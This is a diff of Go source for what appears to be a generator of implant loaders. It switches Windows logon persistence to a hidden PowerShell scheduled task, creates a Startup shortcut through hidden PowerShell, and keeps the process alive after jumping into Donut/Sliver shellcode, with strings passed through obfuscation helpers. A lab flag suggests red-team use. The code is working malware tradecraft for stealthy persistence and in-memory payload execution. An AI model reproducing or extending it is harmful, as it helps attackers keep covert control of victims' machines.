@@ -179,20 +179,22 @@ func persistRun(self string) {
 }
 
 func persistTask(self string) {
+	// schtasks /sc ONLOGON is Access Denied for non-admin on many hosts.
+	// PowerShell Register-ScheduledTask -AtLogOn works for the current user.
 	cmd := exec.Command(
-		ds(` + q("schtasks") + `),
-		ds(` + q("/create") + `),
-		ds(` + q("/tn") + `), persistName,
-		ds(` + q("/sc") + `), ds(` + q("ONLOGON") + `),
-		ds(` + q("/tr") + `), self,
-		ds(` + q("/rl") + `), ds(` + q("LIMITED") + `),
-		ds(` + q("/f") + `),
+		ds(` + q("powershell.exe") + `),
+		ds(` + q("-NoProfile") + `),
+		ds(` + q("-WindowStyle") + `),
+		ds(` + q("Hidden") + `),
+		ds(` + q("-Command") + `),
+		"$a=New-ScheduledTaskAction -Execute '"+self+"';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName '"+persistName+"' -Action $a -Trigger $t -Force | Out-Null",
 	)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_ = cmd.Run()
 }
 
 func persistStartup(self string) {
+	// E-IMZO style: Startup .lnk -> self (do not copy the PE into Startup).
 	appdata := os.Getenv(ds(` + q("APPDATA") + `))
 	if appdata == "" {
 		return
@@ -205,15 +207,15 @@ func persistStartup(self string) {
 		ds(` + q("Startup") + `),
 	)
 	_ = os.MkdirAll(dir, 0o755)
-	dst := filepath.Join(dir, persistName+".exe")
-	if dst == self {
-		return
-	}
-	in, err := os.ReadFile(self)
-	if err != nil {
-		return
-	}
-	_ = os.WriteFile(dst, in, 0o755)
+	dst := filepath.Join(dir, persistName+".lnk")
+	ps := "$s=New-Object -ComObject WScript.Shell; $l=$s.CreateShortcut('" + dst + "'); $l.TargetPath='" + self + "'; $l.WorkingDirectory='" + filepath.Dir(self) + "'; $l.WindowStyle=7; $l.Save()"
+	cmd := exec.Command(ds(` + q("powershell.exe") + `),
+		ds(` + q("-NoProfile") + `),
+		ds(` + q("-WindowStyle") + `),
+		ds(` + q("Hidden") + `),
+		ds(` + q("-Command") + `), ps)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = cmd.Run()
 }
 
 func run() {
@@ -274,6 +276,13 @@ func run() {
 	jump(addr, stk)
 	runtime.KeepAlive(blob)
 	runtime.KeepAlive(noise)
+	// Donut/Sliver PIC often starts the implant on another thread and
+	// returns. If this process exits, that thread dies with it. Lab builds
+	// (SLIV_BG=1) still return so tests can observe the CALL.
+	if labFast() {
+		return
+	}
+	select {}
 }
 
 func main() {
